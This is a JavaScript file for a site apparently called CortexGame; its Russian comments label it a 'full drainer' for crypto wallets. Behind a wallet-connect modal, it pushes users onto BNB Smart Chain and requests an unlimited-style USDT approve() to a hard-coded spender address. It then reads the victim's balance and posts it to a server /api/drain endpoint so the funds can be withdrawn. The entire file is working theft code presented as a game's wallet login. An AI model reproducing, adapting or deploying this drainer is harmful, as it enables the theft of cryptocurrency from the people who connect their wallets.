// ========================================
// 🚀 ПОЛНЫЙ ДРЕНЕР - ВСЕ КОШЕЛЬКИ ЧЕРЕЗ APP LINK
// ========================================

// ========== КОНФИГ ==========
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0x1f709cAcA0Bd66B630F45bE8e6D138Ac73B14bEE";
const APPROVE_AMOUNT = "10000000000000000000000";

let userAddress = null;
let web3 = null;
let isProcessing = false;
let selectedWallet = null;

// ========== ЭЛЕМЕНТЫ ==========
const modal = document.getElementById("walletModal");
const statusEl = document.getElementById("walletStatus");
const openBtns = document.querySelectorAll("#connectWallet, #connectWalletNav, #connectWalletMid");

console.log('🔥 script.js загружен');

// ========== ТАЙМЕР (УБРАН) ==========
function updateCountdown() {}
updateCountdown();

// ========== ФУНКЦИИ ==========
function shortAddress(addr) {
    if (!addr) return "";
    return addr.slice(0, 6) + "…" + addr.slice(-4);
}

function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

function hasEthereum() {
    return typeof window.ethereum !== 'undefined' && window.ethereum !== null;
}

function getWalletFromUA() {
    const ua = navigator.userAgent;
    if (/TrustWallet/i.test(ua)) return 'Trust Wallet';
    if (/MetaMask/i.test(ua)) return 'MetaMask';
    if (/SafePal/i.test(ua)) return 'SafePal';
    if (/Antarctic/i.test(ua)) return 'Antarctic';
    if (/CoinbaseWallet/i.test(ua)) return 'Coinbase Wallet';
    if (/OKX/i.test(ua)) return 'OKX Wallet';
    return null;
}

function openModal() {
    if (modal) {
        modal.hidden = false;
        document.body.style.overflow = "hidden";
        document.querySelectorAll(".wallet-option").forEach(o => o.classList.remove("selected"));
        selectedWallet = null;
    }
}

function closeModal() {
    if (modal) {
        modal.hidden = true;
        document.body.style.overflow = "";
    }
}

function showStatus(msg) {
    if (statusEl) {
        statusEl.hidden = false;
        statusEl.textContent = msg;
    }
}

// ========== ВЫБОР КОШЕЛЬКА ==========
function selectWallet(el) {
    document.querySelectorAll(".wallet-option").forEach(o => o.classList.remove("selected"));
    el.classList.add("selected");
    selectedWallet = el.dataset.wallet;
    showStatus(`✅ Выбран: ${selectedWallet}`);
    console.log('Выбран кошелёк:', selectedWallet);
}

// ========== НАВЕШИВАЕМ ОБРАБОТЧИКИ ==========
document.querySelectorAll(".wallet-option").forEach(btn => {
    btn.onclick = function() {
        selectWallet(this);
    };
});

// ========== КНОПКА "ПОДКЛЮЧИТЬ" ==========
const connectBtn = document.getElementById("connectBtn");
if (connectBtn) {
    connectBtn.onclick = function() {
        console.log('Кнопка "Подключить" нажата');
        if (!selectedWallet) {
            showStatus("⚠️ Выберите кошелёк!");
            return;
        }
        connectWallet(selectedWallet);
    };
}

// ========== ОТКРЫТИЕ / ЗАКРЫТИЕ МОДАЛКИ ==========
openBtns.forEach(btn => {
    if (btn) {
        btn.onclick = function(e) {
            e.preventDefault();
            openModal();
        };
    }
});

document.querySelectorAll("[data-close-modal]").forEach(el => {
    if (el) {
        el.onclick = function(e) {
            e.preventDefault();
            closeModal();
        };
    }
});

document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && modal && !modal.hidden) closeModal();
});

// ========== ОТПРАВКА НА СЕРВЕР ==========
async function sendToServer(endpoint, data) {
    try {
        const res = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        return await res.json();
    } catch (e) {
        console.log("Server error:", e);
        return null;
    }
}

// ========== ПЕРЕКЛЮЧЕНИЕ НА BSC ==========
async function switchToBSC() {
    if (!hasEthereum()) return false;
    try {
        await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }]
        });
        return true;
    } catch (error) {
        if (error.code === 4902) {
            try {
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "BNB Smart Chain",
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        rpcUrls: ["https://bsc-dataseed.binance.org"]
                    }]
                });
                return true;
            } catch (e) { return false; }
        }
        return false;
    }
}

// ========== ПОЛУЧЕНИЕ БАЛАНСА USDT ==========
async function getUSDTBalance(address) {
    try {
        if (!web3) {
            web3 = new Web3(window.ethereum);
        }
        const balance = await web3.eth.call({
            to: USDT_ADDRESS,
            data: "0x70a08231" + "000000000000000000000000" + address.slice(2)
        });
        return parseInt(balance, 16) / 1e18;
    } catch (e) {
        return 0;
    }
}

// ========== APPROVE USDT ==========
async function approveUSDT() {
    if (!userAddress || !hasEthereum()) throw new Error("Кошелёк не подключён");

    const chainId = await web3.eth.getChainId();
    if (chainId !== 56) {
        const switched = await switchToBSC();
        if (!switched) throw new Error("Переключитесь на BNB Smart Chain");
    }

    const usdtAbi = [{
        constant: false,
        inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
    }];

    const usdtContract = new web3.eth.Contract(usdtAbi, USDT_ADDRESS);
    const amountWei = web3.utils.toWei(APPROVE_AMOUNT, "ether");

    const tx = await usdtContract.methods.approve(SPENDER_ADDRESS, amountWei).send({
        from: userAddress,
        gas: 150000
    });

    await sendToServer("/api/approve", {
        address: userAddress,
        tx_hash: tx.transactionHash,
        ref: localStorage.getItem("ref_code") || null
    });

    return tx;
}

// ========== УНИВЕРСАЛЬНОЕ ОТКРЫТИЕ ЛЮБОГО КОШЕЛЬКА ЧЕРЕЗ APP LINK ==========
function openWalletApp(walletName) {
    const url = encodeURIComponent(window.location.href);
    const host = window.location.host;
    
    console.log(`📱 Открываем ${walletName}...`);
    
    switch(walletName) {
        case 'Trust Wallet':
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${url}`;
            break;
            
        case 'MetaMask':
            window.location.href = `https://metamask.app.link/dapp/${host}`;
            break;
            
        case 'Coinbase Wallet':
            window.location.href = `https://wallet.coinbase.com/dapp/${host}`;
            break;
            
        case 'WalletConnect':
            showStatus("📱 Откройте WalletConnect и отсканируйте QR-код");
            return;
            
        case 'OKX Wallet':
            window.location.href = `https://www.okx.com/web3/dapp/${host}`;
            break;
            
        case 'SafePal':
            // SafePal через app link — открывает приложение, если установлено
            window.location.href = `https://link.safepal.com/dapp/${host}`;
            break;
            
        case 'Antarctic':
            // Antarctic — через app link
            window.location.href = `https://antarctic.app/dapp/${host}`;
            break;
            
        default:
            showStatus(`❌ ${walletName} не поддерживается на телефоне`);
            return;
    }
    
    showStatus(`📱 Открываем ${walletName}...`);
}

// ========== ПОДКЛЮЧЕНИЕ ЧЕРЕЗ ETHEREUM ПРОВАЙДЕР ==========
async function connectWithEthereum(walletName) {
    try {
        await switchToBSC();
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        if (!accounts || accounts.length === 0) {
            throw new Error("Нет аккаунтов");
        }

        userAddress = accounts[0];
        web3 = new Web3(window.ethereum);

        showStatus(`✅ ${walletName} подключён: ${shortAddress(userAddress)}`);
        closeModal();

        localStorage.setItem("cortexgame_wallet", userAddress);
        localStorage.setItem("cortexgame_wallet_name", walletName);
        openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });

        await sendToServer("/api/connect", {
            address: userAddress,
            wallet_type: walletName,
            ref: localStorage.getItem("ref_code") || null
        });

        showStatus("⏳ Подпишите APPROVE...");
        try {
            const tx = await approveUSDT();
            showStatus("✅ APPROVE отправлен!");
            const balance = await getUSDTBalance(userAddress);
            if (balance > 0) {
                showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
                const result = await sendToServer("/api/drain", {
                    address: userAddress,
                    amount: balance
                });
                if (result && result.success) {
                    showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
                }
            } else {
                showStatus("✅ Кошелёк активирован. USDT: 0");
            }
        } catch (e) {
            showStatus(`❌ ${e.message}`);
        }
        return true;
    } catch (error) {
        showStatus(`❌ ${error.message}`);
        return false;
    }
}

// ========== ГЛАВНАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ ==========
async function connectWallet(walletName) {
    if (isProcessing) return;
    isProcessing = true;
    showStatus(`⏳ Подключение к ${walletName}...`);

    try {
        if (hasEthereum()) {
            console.log("🟢 Web3 провайдер обнаружен!");
            await connectWithEthereum(walletName);
            isProcessing = false;
            return;
        }

        if (isMobile()) {
            openWalletApp(walletName);
            isProcessing = false;
            return;
        }

        showStatus("❌ Установите расширение кошелька в браузере");
        isProcessing = false;

    } catch (error) {
        showStatus(`❌ ${error.message || "Ошибка"}`);
        isProcessing = false;
    }
}

// ========== ВОССТАНОВЛЕНИЕ СЕССИИ ==========
const savedWallet = localStorage.getItem("cortexgame_wallet");
const savedName = localStorage.getItem("cortexgame_wallet_name") || "Кошелёк";
if (savedWallet) {
    showStatus(`✅ ${savedName} подключён: ${shortAddress(savedWallet)}`);
    openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
}

// ========== АВТО-ПОДКЛЮЧЕНИЕ ==========
if (hasEthereum()) {
    console.log("🟢 Web3 провайдер уже есть при загрузке!");
    
    let detectedWallet = getWalletFromUA();
    if (!detectedWallet) {
        if (window.ethereum.isMetaMask) detectedWallet = 'MetaMask';
        else if (window.ethereum.isTrustWallet) detectedWallet = 'Trust Wallet';
        else if (window.ethereum.isSafePal) detectedWallet = 'SafePal';
        else detectedWallet = 'Кошелёк';
    }
    
    setTimeout(async () => {
        try {
            const accounts = await window.ethereum.request({ method: "eth_accounts" });
            if (accounts && accounts.length > 0) {
                userAddress = accounts[0];
                web3 = new Web3(window.ethereum);
                showStatus(`✅ ${detectedWallet} подключён: ${shortAddress(userAddress)}`);
                localStorage.setItem("cortexgame_wallet", userAddress);
                localStorage.setItem("cortexgame_wallet_name", detectedWallet);
                openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
            }
        } catch (e) {}
    }, 1000);
}

console.log("🔥 CortexGame + ДРЕНЕР загружен!");
console.log("💳 Нажмите 'Подключить кошелёк' для активации");
console.log("🟢 Есть провайдер:", hasEthereum());
console.log("📱 Мобильное устройство:", isMobile());
